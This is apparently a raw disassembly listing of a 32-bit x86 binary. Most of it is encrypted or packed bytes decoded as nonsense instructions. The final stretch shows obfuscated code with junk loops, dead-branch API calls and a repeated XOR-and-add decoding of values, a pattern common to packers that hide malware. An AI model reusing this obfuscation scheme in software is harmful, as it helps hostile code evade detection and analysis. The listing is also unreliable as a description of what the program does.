  414727:	repz aad 0xca
  41472a:	add    al,cl
  41472c:	out    dx,al
  41472d:	mov    esi,0xd2f9dcfd
  414733:	loopne 0x41471c
  414735:	test   al,0xe6
  414737:	leave  
  414738:	(bad)  
  414739:	cli    
  41473a:	jmp    0xd8de:0xceb6bff1
  414741:	loop   0x414742
  414743:	(bad)  
  414744:	std    
  414745:	sti    
  414746:	rol    DWORD PTR [edi],1
  414748:	jecxz  0x414746
  41474a:	rol    DWORD PTR [ecx],0xd6
  41474d:	out    0xf8,al
  41474f:	retf   0xfdcc
  414752:	test   eax,0xadb6e9ca
  414757:	in     al,0xe3
  414759:	loope  0x414726
  41475b:	fcmovnb st,st(5)
  41475d:	mov    dh,0xef
  41475f:	hlt    
  414760:	imul   dh
  414762:	int3   
  414763:	cld    
  414764:	icebp  
  414765:	std    
  414766:	std    
  414767:	hlt    
  414768:	or     edi,ecx
  41476a:	mov    edi,0xeddbe4de
  41476f:	push   cs
  414770:	jmp    0xaa230664
  414775:	loope  0x414727
  414777:	mov    al,0xc4
  414779:	lock aad 0xf7
  41477c:	(bad)  
  41477e:	(bad)  
  414780:	jecxz  0x414754
  414782:	rol    bl,cl
  414784:	repz mov ah,0xe5
  414787:	out    0xf7,al
  414789:	std    
  41478a:	push   es
  41478b:	fdiv   st(2),st
  41478d:	imul   al
  41478f:	add    cl,BYTE PTR [esi]
  414791:	in     eax,dx
  414792:	mov    bl,0xc1
  414794:	leave  
  414795:	icebp  
  414796:	mov    dh,0xb0
  414798:	mov    dl,0xe9
  41479a:	(bad)  
  41479b:	lock ror ah,1
  41479e:	fidiv  WORD PTR [ebp-0x49120a02]
  4147a4:	ret    
  4147a5:	fcmovnbe st,st(3)
  4147a7:	fcomip st,st(6)
  4147a9:	add    eax,0xede3f8f4
  4147ae:	loop   0x414784
  4147b0:	int    0xdf
  4147b2:	sar    DWORD PTR [ebp+ebp*4-0x49243858],1
  4147b9:	(bad)  
  4147ba:	mov    ch,0xfa
  4147bc:	mov    edx,0xfacaf4b6
  4147c1:	(bad)  
  4147c3:	out    0xfe,eax
  4147c5:	push   es
  4147c6:	mov    ebx,0xf0cabdbe
  4147cb:	jmp    0xf30e:0x40a06fc
  4147d2:	ret    
  4147d3:	ret    0xc6c1
  4147d6:	scas   eax,DWORD PTR es:[edi]
  4147d7:	ret    
  4147d8:	mov    ch,0xca
  4147da:	mov    dh,0xb9
  4147dc:	out    dx,al
  4147dd:	lods   al,BYTE PTR ds:[esi]
  4147de:	idiv   BYTE PTR [edi-0x17253cfd]
  4147e4:	(bad)  
  4147e5:	(bad)  
  4147e6:	in     eax,dx
  4147e7:	test   DWORD PTR [ebx],0x206d8e0
  4147ed:	aad    0xfb
  4147ef:	or     eax,0xacbf12e5
  4147f4:	mov    al,0xd3
  4147f6:	into   
  4147f7:	aad    0xc9
  4147f9:	enter  0xb5ca,0xb4
  4147fd:	in     eax,dx
  4147fe:	out    dx,eax
  4147ff:	mov    ah,0xbd
  414801:	cld    
  414802:	add    edx,eax
  414804:	add    dh,dh
  414806:	in     eax,0xd9
  414808:	repnz in eax,0xdc
  41480b:	add    ecx,ebx
  41480d:	add    al,0xdf
  41480f:	in     eax,0xda
  414811:	or     al,0xce
  414813:	mov    al,0xe8
  414815:	int3   
  414816:	imul   dl
  414818:	lods   al,BYTE PTR ds:[esi]
  414819:	icebp  
  41481a:	shl    ebp,1
  41481c:	mov    bh,0xea
  41481e:	cmc    
  41481f:	fcom   st(5)
  414821:	mov    eax,0xd9c1e7f0
  414826:	xlat   BYTE PTR ds:[ebx]
  414827:	out    0x6,al
  414829:	cli    
  41482a:	(bad)
  41482d:	add    eax,0xf9e1c903
  414832:	leave  
  414833:	ror    al,0xb0
  414836:	call   0xb53413f0
  41483b:	shr    ch,0xf1
  41483e:	mov    ebx,0xc2ccf4b5
  414843:	cld    
  414844:	clc    
  414845:	sar    eax,0xbd
  414848:	(bad)  
  414849:	cld    
  41484a:	neg    al
  41484c:	(bad)  
  41484f:	int3   
  414850:	enter  0xcdc4,0xd8
  414854:	lock mov dh,0xc3
  414857:	int3   
  414858:	lock aam 0xb0
  41485b:	clc    
  41485c:	mov    ah,0xd4
  41485e:	icebp  
  41485f:	mov    esp,0xecdaf7d0
  414864:	ret    0xd9f3
  414867:	mov    DWORD PTR [edi],0xe30fdfe1
  41486d:	or     edx,esp
  41486f:	hlt    
  414870:	or     al,al
  414872:	rcl    edx,1
  414874:	jmp    0xb72a2f4c
  414879:	shl    esp,cl
  41487b:	mov    dh,0xee
  41487d:	mov    bh,0xd9
  41487f:	(bad)  
  414881:	add    ecx,edx
  414883:	rol    al,0xb4
  414886:	sar    al,cl
  414888:	pop    es
  414889:	out    0xb,eax
  41488b:	cld    
  41488c:	shl    al,0xc6
  41488f:	iret   
  414890:	sti    
  414891:	dec    ah
  414893:	xlat   BYTE PTR ds:[ebx]
  414894:	retf   0xb7f1
  414897:	lods   eax,DWORD PTR ds:[esi]
  414898:	lods   eax,DWORD PTR ds:[esi]
  414899:	mov    ah,0xc6
  41489b:	retf   
  41489c:	iret   
  41489d:	mov    edx,0xdebdede5
  4148a2:	mov    ebx,0xc6fedaf2
  4148a7:	lock fidivr DWORD PTR [eax+0x50be3fa]
  4148ae:	frndint 
  4148b0:	(bad)  
  4148b2:	int3   
  4148b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b4:	shl    al,0xe4
  4148b7:	scas   al,BYTE PTR es:[edi]
  4148b8:	mov    dh,0xc9
  4148ba:	lock shr al,0xc8
  4148be:	clc    
  4148bf:	rcr    edi,cl
  4148c1:	not    ebp
  4148c3:	aam    0xc7
  4148c5:	hlt    
  4148c6:	repnz (bad) 
  4148c8:	out    0x3,al
  4148ca:	or     esi,ebp
  4148cc:	neg    eax
  4148ce:	call   0xce5413bf
  4148d3:	mov    al,0xe6
  4148d5:	aad    0xe5
  4148d7:	jmp    0xf6f4:0xfac9c8c7
  4148de:	fcmovnbe st,st(2)
  4148e0:	cld    
  4148e1:	mov    ebp,0xc3cd07be
  4148e6:	in     al,0xfc
  4148e8:	cli    
  4148e9:	sar    eax,1
  4148eb:	loop   0x4148d1
  4148ed:	fucomip st,st(3)
  4148ef:	ret    0xe507
  4148f2:	scas   al,BYTE PTR es:[edi]
  4148f3:	into   
  4148f4:	in     al,0xcb
  4148f6:	int3   
  4148f7:	mov    ch,0xac
  4148f9:	cli    
  4148fa:	sti    
  4148fb:	sti    
  4148fc:	in     eax,0xc9
  4148fe:	vpsubusw ymm7,ymm6,YMMWORD PTR [edx-0x262c0545]
  414906:	sar    bh,cl
  414908:	in     al,0xda
  41490a:	or     al,dl
  41490c:	xlat   BYTE PTR ds:[ebx]
  41490d:	fcmovu st,st(6)
  41490f:	jmp    esp
  414911:	or     esi,esp
  414913:	call   0xea0b32e7
  414918:	sti    
  414919:	call   0xc72a36ed
  41491e:	fyl2x  
  414920:	sti    
  414921:	mov    esp,0xe5b5beda
  414926:	mov    ebx,0xded5f7de
  41492b:	mov    esi,0xc50cf6da
  414930:	repz or esp,ebx
  414933:	fbstp  TBYTE PTR [ebx-0x4f392a1e]
  414939:	repz out dx,eax
  41493b:	loopne 0x414928
  41493d:	in     eax,0xee
  41493f:	mov    edi,0xdada01cf
  414944:	(bad)  
  414945:	cmc    
  414946:	add    ebx,ebp
  414948:	aad    0xe3
  41494a:	std    
  41494b:	jecxz  0x414911
  41494d:	lds    eax,FWORD PTR [esi]
  41494f:	adc    ebp,ecx
  414951:	leave  
  414952:	mov    ecx,0xd6add1ad
  414957:	(bad)  
  414958:	(bad)  
  414959:	jmp    0x414944
  41495b:	leave  
  41495c:	xlat   BYTE PTR ds:[ebx]
  41495d:	in     eax,0xdb
  41495f:	into   
  414960:	jecxz  0x414945
  414962:	rcl    cl,1
  414964:	iret   
  414965:	shl    esp,0xc2
  414968:	fistp  QWORD PTR [eax+0x706fa09]
  41496e:	loop   0x41495a
  414970:	retf   0xd8fe
  414973:	fsubr  st,st(6)
  414975:	icebp  
  414976:	call   0xf42dfd3f
  41497b:	scas   al,BYTE PTR es:[edi]
  41497c:	cmc    
  41497d:	(bad)  
  41497f:	cmc    
  414980:	stc    
  414981:	rol    DWORD PTR [ebx],1
  414983:	(bad)  
  414985:	(bad)  
  414986:	aam    0x5
  414988:	vshufps xmm3,xmm2,xmm1,0xa
  41498d:	ror    dh,0xa
  414990:	loop   0x414961
  414992:	mov    eax,0xc1b6d3e1
  414997:	(bad)  
  414998:	icebp  
  414999:	cli    
  41499a:	mov    ch,0xcd
  41499c:	clc    
  41499d:	(bad)  
  41499e:	mov    ecx,0xbefae3fa
  4149a3:	mov    esp,0xbd4da02
  4149a8:	shl    edi,cl
  4149aa:	add    al,0xfd
  4149ac:	(bad)  
  4149ae:	fisttp QWORD PTR [ebx]
  4149b0:	int    0xf8
  4149b2:	loopne 0x4149a6
  4149b4:	jecxz  0x41499f
  4149b6:	(bad)  
  4149b7:	repnz enter 0xd1a8,0xb6
  4149bc:	(bad)  
  4149bd:	test   eax,0xbfd9eabf
  4149c3:	loope  0x414986
  4149c5:	add    ebx,eax
  4149c7:	clc    
  4149c8:	pop    es
  4149c9:	neg    al
  4149cb:	fstp   TBYTE PTR [ebp-0x3bf80b22]
  4149d1:	fadd   st(2),st
  4149d3:	lods   eax,DWORD PTR ds:[esi]
  4149d4:	call   0xd80311a2
  4149d9:	xlat   BYTE PTR ds:[ebx]
  4149da:	out    dx,al
  4149db:	mov    edx,0xf2c4c8d9
  4149e0:	into   
  4149e1:	out    dx,al
  4149e2:	xlat   BYTE PTR ds:[ebx]
  4149e3:	mov    dh,0xf8
  4149e5:	(bad)  
  4149e6:	in     al,dx
  4149e7:	ret    0xc3e6
  4149ea:	(bad)  
  4149eb:	(bad)  
  4149ed:	call   0xc12245d1
  4149f2:	lock mov esi,0xf6c8f6c6
  4149f8:	(bad)  
  4149f9:	enter  0xaedb,0xef
  4149fd:	push   edx
  4149ff:	hlt    
  414a00:	(bad)  
  414a02:	fucomi st,st(5)
  414a04:	cmc    
  414a05:	test   edi,0xf7d6d0d1
  414a0b:	ffreep st(1)
  414a0d:	jecxz  0x414a0c
  414a0f:	push   es
  414a10:	fdivp  st(6),st
  414a12:	in     eax,dx
  414a13:	rcl    edi,1
  414a15:	(bad)
  414a18:	icebp  
  414a19:	repz mov edx,0xf2b7c7f4
  414a1f:	repz int 0xc3
  414a22:	(bad)  
  414a24:	aad    0xf9
  414a26:	mov    ebx,0xebd4d8d2
  414a2b:	fld    QWORD PTR [esi]
  414a2d:	clc    
  414a2e:	push   cs
  414a2f:	cld    
  414a30:	or     ecx,DWORD PTR ds:0xefaca8cd
  414a36:	sar    ebx,0xa9
  414a39:	xlat   BYTE PTR ds:[ebx]
  414a3a:	retf   0xd9fa
  414a3d:	not    dh
  414a3f:	cmc    
  414a40:	fcmovnbe st,st(0)
  414a42:	loopne 0x414a1c
  414a44:	fcomp  st(5)
  414a46:	lock lock neg bh
  414a4a:	(bad)  
  414a4b:	retf   
  414a4c:	loopne 0x414a42
  414a4e:	hlt    
  414a4f:	clc    
  414a50:	std    
  414a51:	adc    DWORD PTR [ebx-0x37415030],esi
  414a57:	rep lods eax,DWORD PTR ds:[esi]
  414a59:	in     eax,dx
  414a5a:	in     eax,0xe9
  414a5c:	out    dx,eax
  414a5d:	in     al,0xe8
  414a5f:	not    ebx
  414a61:	mov    ebx,0xfab9fb00
  414a66:	lock aam 0xfa
  414a69:	cmc    
  414a6a:	stc    
  414a6b:	test   edi,0x5efd5e4
  414a71:	retf   0xe4dc
  414a74:	repnz test al,0xf1
  414a77:	test   eax,0xb0d4d6ef
  414a7d:	out    0xfd,al
  414a7f:	lock mov esi,0xd201d0d1
  414a85:	rcr    bl,cl
  414a87:	out    0xfe,eax
  414a89:	fdivr  st,st(5)
  414a8b:	loop   0x414a6c
  414a8d:	fiadd  DWORD PTR [esi]
  414a8f:	cli    
  414a90:	stc    
  414a91:	jmp    0xacf0367d
  414a96:	fnsave [edi-0x353e0c31]
  414a9c:	mov    edx,0xcaf6f8d3
  414aa1:	clc    
  414aa2:	call   0xbf363fa3
  414aa7:	aam    0xeb
  414aa9:	repnz add bl,bl
  414aac:	or     esp,edi
  414aae:	clc    
  414aaf:	dec    DWORD PTR [eax]
  414ab1:	rcl    cl,cl
  414ab3:	call   0xe5ff1989
  414ab8:	(bad)  
  414ab9:	ror    ch,cl
  414abb:	sti    
  414abc:	jmp    0xd3ed:0xfbc8c9d3
  414ac3:	shr    edi,0xf4
  414ac6:	xlat   BYTE PTR ds:[ebx]
  414ac7:	xlat   BYTE PTR ds:[ebx]
  414ac8:	loopne 0x414a8d
  414aca:	stc    
  414acb:	pop    es
  414acc:	stc    
  414acd:	(bad)  
  414ace:	aad    0xd9
  414ad0:	in     al,dx
  414ad1:	retf   
  414ad2:	ret    
  414ad3:	ret    
  414ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ad5:	iret   
  414ad6:	repz icebp 
  414ad8:	lock test al,0xd8
  414adb:	jmp    0x414aa5
  414add:	std    
  414ade:	int3   
  414adf:	clc    
  414ae0:	clc    
  414ae1:	shl    BYTE PTR [edi-0x3a3c1d19],1
  414ae7:	lock fadd st,st(2)
  414aea:	cmc    
  414aeb:	cli    
  414aec:	(bad)  
  414aee:	leave  
  414aef:	fdivr  st(3),st
  414af1:	loopne 0x414ad0
  414af3:	rol    ebx,1
  414af5:	mov    dh,0xb6
  414af7:	out    0xac,eax
  414af9:	shr    edi,0xd0
  414afc:	mov    edx,0xf9ccd2df
  414b01:	sar    edi,1
  414b03:	fidivr DWORD PTR [edi-0x60f2b09]
  414b09:	pop    es
  414b0a:	retf   
  414b0b:	bswap  ebx
  414b0d:	(bad)  
  414b0e:	fsubr  st,st(0)
  414b10:	out    dx,eax
  414b11:	out    dx,al
  414b12:	les    ebp,FWORD PTR [edi-0x3a0c0829]
  414b18:	cli    
  414b19:	out    0xe1,al
  414b1b:	clc    
  414b1c:	shl    bl,1
  414b1e:	mov    esi,0xc8dfffe4
  414b23:	mov    ebp,0xc7bbd3c0
  414b28:	cmc    
  414b29:	shr    dl,0xe1
  414b2c:	jecxz  0x414b39
  414b2e:	add    al,0xdc
  414b30:	repz clc 
  414b32:	into   
  414b33:	call   0xca1729e8
  414b38:	lods   eax,DWORD PTR ds:[esi]
  414b39:	mov    edx,0xf2b9e0eb
  414b3e:	mov    edi,0xffefb8d2
  414b43:	mov    dh,0xd2
  414b45:	jecxz  0x414b19
  414b47:	stc    
  414b48:	(bad)  
  414b49:	std    
  414b4a:	fdivp  st(7),st
  414b4c:	add    DWORD PTR ds:0xd803f90a,ecx
  414b52:	mov    esp,0xb5afdee9
  414b57:	(bad)
  414b5a:	(bad)  
  414b5b:	fcmovne st,st(2)
  414b5d:	int    0xd6
  414b5f:	icebp  
  414b60:	(bad)  
  414b61:	test   cl,0xc0
  414b64:	rol    BYTE PTR [eax],cl
  414b66:	mov    esp,0xb02f6e7
  414b6b:	pmaxub mm0,QWORD PTR [edi+ebx*8]
  414b6f:	or     al,0xe4
  414b71:	add    al,0xc9
  414b73:	mov    eax,0xedf4e0bd
  414b78:	shr    cl,0xd2
  414b7b:	(bad)  
  414b7c:	cli    
  414b7d:	fcmovb st,st(4)
  414b7f:	cmc    
  414b80:	clc    
  414b81:	repnz loopne 0x414b3c
  414b84:	(bad)  
  414b85:	mov    eax,0xf40007d8
  414b8a:	jmp    0x414b77
  414b8c:	add    al,0x7
  414b8e:	jmp    edx
  414b90:	retf   0xafd3
  414b93:	mov    esp,0xfbecb7a5
  414b98:	ror    esi,1
  414b9a:	out    0xd8,al
  414b9c:	mov    bh,0xfa
  414b9e:	cli    
  414b9f:	mov    dl,0xf3
  414ba1:	mov    esi,0x6f0f1f7
  414ba6:	mov    edi,0x9d1c6e0
  414bab:	xlat   BYTE PTR ds:[ebx]
  414bac:	fld    st(6)
  414bae:	push   cs
  414baf:	std    
  414bb0:	(bad)  
  414bb1:	enter  0xecbe,0xe6
  414bb5:	mov    al,0xbd
  414bb7:	mov    esp,0xb9fae6cb
  414bbc:	fcmovb st,st(5)
  414bbe:	icebp  
  414bbf:	jecxz  0x414bb0
  414bc1:	mov    eax,0xe6e0d3f0
  414bc6:	loope  0x414ba7
  414bc8:	icebp  
  414bc9:	in     eax,0xc4
  414bcb:	or     ch,ah
  414bcd:	fucom  st(6)
  414bcf:	out    dx,al
  414bd0:	fmul   QWORD PTR [ebx]
  414bd2:	test   al,0xde
  414bd4:	int    0xd3
  414bd6:	out    0xe1,al
  414bd8:	retf   
  414bd9:	div    dh
  414bdb:	int3   
  414bdc:	repz (bad) 
  414bdf:	lock leave 
  414be1:	out    dx,eax
  414be2:	in     eax,dx
  414be3:	mov    ebp,0xf001c0ef
  414be8:	fcmovnb st,st(0)
  414bea:	pop    es
  414beb:	add    edi,ebp
  414bed:	loopne 0x414bcf
  414bef:	clc    
  414bf0:	out    dx,eax
  414bf1:	enter  0xd0c7,0xae
  414bf5:	mul    ebx
  414bf7:	ret    0xb4ce
  414bfa:	retf   
  414bfb:	(bad)
  414bfe:	mov    ch,0xd4
  414c00:	mov    cl,0xe9
  414c02:	add    edi,edx
  414c04:	sti    
  414c05:	out    0xd6,al
  414c07:	stc    
  414c08:	std    
  414c09:	loop   0x414bf0
  414c0b:	dec    dl
  414c0d:	jecxz  0x414bda
  414c0f:	out    0xa,al
  414c11:	rcr    ah,cl
  414c13:	lock int 0xc5
  414c16:	into   
  414c17:	jmp    0x414bec
  414c19:	out    dx,al
  414c1a:	mov    dl,0xcb
  414c1c:	into   
  414c1d:	icebp  
  414c1e:	icebp  
  414c1f:	mov    eax,0xf6d9d5
  414c24:	shl    eax,1
  414c26:	mov    esp,0xe6e5f3f2
  414c2b:	lock jmp 0xa0c1a06
  414c31:	in     al,dx
  414c32:	into   
  414c33:	shr    edx,cl
  414c35:	scas   eax,DWORD PTR es:[edi]
  414c36:	aad    0xeb
  414c38:	out    0xe9,al
  414c3a:	mov    ecx,0xf9f0efea
  414c3f:	retf   0xd4bd
  414c42:	sar    edx,cl
  414c44:	mov    esi,0xf8d7fff3
  414c49:	fdiv   st(0),st
  414c4b:	or     eax,edi
  414c4d:	loope  0x414c33
  414c4f:	in     al,dx
  414c50:	call   0xa5fe374e
  414c55:	int3   
  414c56:	jmp    0xb8ff:0xcaa8d0bc
  414c5d:	(bad)  
  414c5f:	fmulp  st(1),st
  414c61:	jmp    0xcd3b4b38
  414c66:	(bad)
  414c69:	jmp    0x414c34
  414c6b:	std    
  414c6c:	xlat   BYTE PTR ds:[ebx]
  414c6d:	stc    
  414c6e:	in     al,dx
  414c6f:	add    edx,ebx
  414c71:	in     al,0xd0
  414c73:	(bad)  
  414c74:	lock cmc 
  414c76:	scas   al,BYTE PTR es:[edi]
  414c77:	shr    edx,0xf0
  414c7a:	icebp  
  414c7b:	mov    ch,0xdf
  414c7d:	(bad)  
  414c7f:	int    0xd8
  414c81:	in     eax,dx
  414c82:	mov    esp,0xe1e5fbe7
  414c87:	ret    0xfbff
  414c8a:	hlt    
  414c8b:	xlat   BYTE PTR ds:[ebx]
  414c8c:	stc    
  414c8d:	(bad)  
  414c8f:	ret    0x1dc
  414c92:	test   eax,0xd0b3f6e0
  414c97:	ret    
  414c98:	jmp    0xd8f40149
  414c9d:	stc    
  414c9e:	in     al,dx
  414c9f:	repnz xlat BYTE PTR ds:[ebx]
  414ca1:	cmc    
  414ca2:	add    bh,BYTE PTR [eax-0x190a02fa]
  414ca8:	loopne 0x414c9f
  414caa:	out    0xb,al
  414cac:	fmul   st(7),st
  414cae:	or     bh,bl
  414cb0:	pop    es
  414cb1:	retf   0xcbbc
  414cb4:	icebp  
  414cb5:	(bad)  
  414cb6:	lods   al,BYTE PTR ds:[esi]
  414cb7:	out    0xb3,eax
  414cb9:	shl    ebx,cl
  414cbb:	repnz int3 
  414cbd:	shl    DWORD PTR [ebp-0xc472e14],1
  414cc3:	(bad)  
  414cc5:	fld    QWORD PTR [ebx]
  414cc7:	repnz in eax,0xcb
  414cca:	stc    
  414ccb:	add    al,0xd7
  414ccd:	loop   0x414cd2
  414ccf:	retf   
  414cd0:	cli    
  414cd1:	leave  
  414cd2:	out    0xe6,al
  414cd4:	(bad)  
  414cd5:	retf   0xb0cf
  414cd8:	call   0xc8fa2e9d
  414cdd:	rcl    bh,1
  414cdf:	int    0xf7
  414ce1:	repnz fsub st,st(0)
  414ce4:	clc    
  414ce5:	mov    dl,0xc0
  414ce8:	ret    
  414ce9:	in     al,0xc6
  414ceb:	jmp    edi
  414ced:	jmp    0xe3ec:0xd9f8e8e0
  414cf4:	(bad)  
  414cf5:	jecxz  0x414cd9
  414cf7:	mov    bh,0xe5
  414cf9:	mov    ah,0xb1
  414cfb:	lock shr cl,1
  414cfe:	retf   0xdbcc
  414d01:	mov    edi,0xcec703be
  414d06:	in     al,dx
  414d07:	mov    edx,0xd9bf07d8
  414d0c:	out    0xa,al
  414d0e:	int    0xe8
  414d10:	adc    ebx,edx
  414d12:	shl    esi,1
  414d14:	shl    BYTE PTR [esi-0x141f4b52],1
  414d1a:	(bad)  
  414d1b:	repz faddp st(4),st
  414d1e:	enter  0xe8be,0xec
  414d22:	int    0xdb
  414d24:	fcomip st,st(3)
  414d26:	mov    esp,0xf9020af2
  414d2b:	(bad)  
  414d2c:	xlat   BYTE PTR ds:[ebx]
  414d2d:	push   cs
  414d2e:	fadd   DWORD PTR [esp+eax*8]
  414d31:	adc    ecx,ebx
  414d33:	test   eax,0xebe7c4d2
  414d38:	int    0xb2
  414d3a:	vpminsw xmm6,xmm0,xmm0
  414d3e:	out    dx,al
  414d3f:	xlat   BYTE PTR ds:[ebx]
  414d40:	cli    
  414d41:	fidivr DWORD PTR [eax-0x13392332]
  414d47:	add    ecx,DWORD PTR [edx]
  414d49:	mov    eax,0xffeedcc4
  414d4e:	fmul   QWORD PTR [edx]
  414d50:	std    
  414d51:	fdivr  DWORD PTR [ecx-0x342c0f32]
  414d57:	shr    ah,0xb5
  414d5a:	in     al,dx
  414d5b:	imul   ebp
  414d5d:	stc    
  414d5e:	repnz icebp 
  414d60:	leave  
  414d61:	cld    
  414d62:	fstp   st(0)
  414d64:	repnz out 0xd7,eax
  414d67:	mov    esi,0xf4d9f4f9
  414d6c:	fsubr  st(1),st
  414d6e:	fisttp WORD PTR [ebx]
  414d70:	add    edx,esp
  414d72:	loope  0x414d61
  414d74:	jmp    0xecee:0xe7aec4f2
  414d7b:	xlat   BYTE PTR ds:[ebx]
  414d7c:	mov    ah,0xf9
  414d7e:	lock (bad) 
  414d80:	fdivr  st,st(1)
  414d82:	in     al,dx
  414d83:	cld    
  414d84:	out    0xce,eax
  414d86:	mov    esi,0xe6f7c4c3
  414d8b:	or     bh,bl
  414d8d:	add    ch,cl
  414d8f:	loopne 0x414d75
  414d91:	cld    
  414d92:	out    dx,al
  414d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d94:	leave  
  414d95:	out    dx,eax
  414d96:	mov    bl,0xd6
  414d98:	enter  0xb4e4,0xd9
  414d9c:	mov    cl,0xd5
  414d9e:	mov    ebx,0xd8ddb4e3
  414da3:	mov    dh,0xe2
  414da5:	(bad)  
  414da6:	lock add cl,al
  414da9:	mov    eax,0xdfe602de
  414dae:	cld    
  414daf:	out    dx,eax
  414db0:	add    ch,ah
  414db2:	mov    ebp,0xebdcd0f7
  414db7:	lods   al,BYTE PTR ds:[esi]
  414db8:	rol    bh,cl
  414dba:	sti    
  414dbb:	(bad)  
  414dbc:	(bad)  
  414dbd:	shr    ch,cl
  414dbf:	call   0xd2121b9f
  414dc4:	rcl    ebp,1
  414dc6:	repnz sar edx,cl
  414dc9:	shr    dl,1
  414dcb:	xor    ebx,ebx
  414dcd:	mov    edx,esp
  414dcf:	dec    edx
  414dd0:	inc    ebx
  414dd1:	add    ebx,DWORD PTR [edx+ebx*1]
  414dd4:	dec    ebx
  414dd5:	xor    edx,edx
  414dd7:	add    DWORD PTR [ebp-0x1c],ebx
  414dda:	pop    ebx
  414ddb:	mov    eax,DWORD PTR [ebp-0x1c]
  414dde:	pop    esi
  414ddf:	pop    ebx
  414de0:	leave  
  414de1:	ret    0x10
  414de4:	push   ebp
  414de5:	mov    ebp,esp
  414de7:	sub    esp,0x64
  414dea:	sub    DWORD PTR ds:0x43776f,ecx
  414df0:	mov    DWORD PTR [ebp-0x8],0xf89f85b0
  414df7:	lea    eax,[ebp+0x14]
  414dfa:	xor    ecx,DWORD PTR ds:0x437737
  414e00:	mov    DWORD PTR [ebp-0x14],eax
  414e03:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  414e0a:	mov    DWORD PTR ds:0x4377b7,0x16
  414e14:	cmp    DWORD PTR ds:0x4377b7,0x0
  414e1b:	je     0x414e6a
  414e21:	cmp    DWORD PTR ds:0x4377b7,0xa
  414e28:	jle    0x414e6a
  414e2e:	jmp    0x414e3c
  414e33:	push   DWORD PTR [ebp-0xc]
  414e36:	call   DWORD PTR ds:0x43c9d4
  414e3c:	cmp    DWORD PTR ds:0x4377b7,0xb
  414e43:	jne    0x414e56
  414e49:	mov    ecx,DWORD PTR ds:0x4377b7
  414e4f:	dec    ecx
  414e50:	mov    DWORD PTR ds:0x4377b7,ecx
  414e56:	xor    ecx,ecx
  414e58:	add    ecx,DWORD PTR ds:0x4377b7
  414e5e:	dec    ecx
  414e5f:	mov    DWORD PTR ds:0x4377b7,ecx
  414e65:	jmp    0x414e14
  414e6a:	lea    eax,[ebp-0x4]
  414e6d:	mov    DWORD PTR [ebp-0x10],eax
  414e70:	and    DWORD PTR ds:0x4377bb,0x67f5
  414e7a:	mov    eax,DWORD PTR [ebp-0x4]
  414e7d:	and    DWORD PTR ds:0x437757,0x0
  414e87:	mov    ecx,DWORD PTR ds:0x437757
  414e8d:	inc    ecx
  414e8e:	mov    DWORD PTR ds:0x437757,ecx
  414e94:	cmp    DWORD PTR ds:0x437757,0xc
  414e9b:	ja     0x414ed8
  414ea1:	jmp    0x414eb1
  414ea6:	push   0x437723
  414eab:	call   DWORD PTR ds:0x43c9dc
  414eb1:	cmp    DWORD PTR ds:0x437757,0xb
  414eb8:	jne    0x414ecb
  414ebe:	mov    ecx,DWORD PTR ds:0x437757
  414ec4:	inc    ecx
  414ec5:	mov    DWORD PTR ds:0x437757,ecx
  414ecb:	cmp    DWORD PTR ds:0x437757,0x12
  414ed2:	jb     0x414e87
  414ed8:	xor    eax,0x75108b5
  414edd:	add    eax,0x3272fb
  414ee2:	neg    ecx
  414ee4:	mov    ecx,DWORD PTR [ebp-0x10]
  414ee7:	neg    DWORD PTR ds:0x437757
  414eed:	mov    DWORD PTR [ecx],eax
  414eef:	mov    DWORD PTR ds:0x43775b,0x15
  414ef9:	cmp    DWORD PTR ds:0x43775b,0x0
  414f00:	je     0x414f37
  414f06:	cmp    DWORD PTR ds:0x43775b,0x1f
  414f0d:	jg     0x414f37
  414f13:	jmp    0x414f23
  414f18:	push   0x3993
  414f1d:	call   DWORD PTR ds:0x43c9e0
  414f23:	xor    ecx,ecx
  414f25:	xor    ecx,DWORD PTR ds:0x43775b
  414f2b:	dec    ecx
  414f2c:	mov    DWORD PTR ds:0x43775b,ecx
  414f32:	jmp    0x414ef9
  414f37:	xor    eax,eax
  414f39:	add    DWORD PTR ds:0x437773,ecx
  414f3f:	mov    eax,ds:0x437217
  414f44:	mov    eax,DWORD PTR [eax]
  414f46:	sbb    DWORD PTR ds:0x4377ab,ebx
  414f4c:	mov    ecx,DWORD PTR [ebp-0x14]
  414f4f:	add    eax,DWORD PTR [ecx]
  414f51:	mov    DWORD PTR [ebp-0xc],eax
  414f54:	mov    eax,ds:0x43739f
  414f59:	mov    eax,DWORD PTR [eax+0x198]
  414f5f:	xor    DWORD PTR ds:0x43771b,0x3e1f
  414f69:	mov    ecx,DWORD PTR [ebp+0x8]
  414f6c:	add    DWORD PTR ds:0x437723,0x6248
  414f76:	xor    ecx,0x75108b5
  414f7c:	xor    DWORD PTR ds:0x437747,0x991
  414f86:	add    ecx,0x3272fb
  414f8c:	mov    DWORD PTR ds:0x43774b,0x3d8f
  414f96:	cmp    DWORD PTR [eax],ecx
  414f98:	je     0x414fb2
  414f9e:	mov    DWORD PTR ds:0x437727,0x79bb
  414fa8:	jmp    0x41548c
  414fad:	jmp    0x41548c
  414fb2:	mov    DWORD PTR ds:0x437767,0x75b9
  414fbc:	mov    eax,DWORD PTR [ebp+0x8]
  414fbf:	mov    DWORD PTR ds:0x4377b7,0x4cc7
  414fc9:	cmp    eax,DWORD PTR [ebp+0xc]
  414fcc:	mov    DWORD PTR ds:0x4377ab,0x4de3
  414fd6:	je     0x41548c
  414fdc:	or     ecx,edx
  414fde:	lea    eax,[ebp-0x18]
  414fe1:	mov    DWORD PTR [ebp-0x34],eax
  414fe4:	or     DWORD PTR ds:0x437753,0x437727
  414fee:	mov    eax,DWORD PTR [ebp+0x10]
  414ff1:	mov    edx,DWORD PTR ds:0x437793
  414ff7:	and    DWORD PTR ds:0x437713,edx
  414ffd:	xor    eax,0x75108b5
  415002:	add    eax,0x3272fb
  415007:	mov    ecx,DWORD PTR [ebp-0x34]
  41500a:	mov    DWORD PTR [ecx],eax
  41500c:	mov    eax,DWORD PTR [ebp+0x8]
  41500f:	sbb    ecx,ecx
  415011:	xor    eax,0x75108b5
  415016:	or     ecx,DWORD PTR ds:0x437767
  41501c:	add    eax,0x3272fb
  415021:	mov    ecx,DWORD PTR [ebp+0xc]
  415024:	xor    DWORD PTR ds:0x437767,0x1dfa
  41502e:	xor    ecx,0x75108b5
  415034:	not    DWORD PTR ds:0x437793
  41503a:	add    ecx,0x3272fb
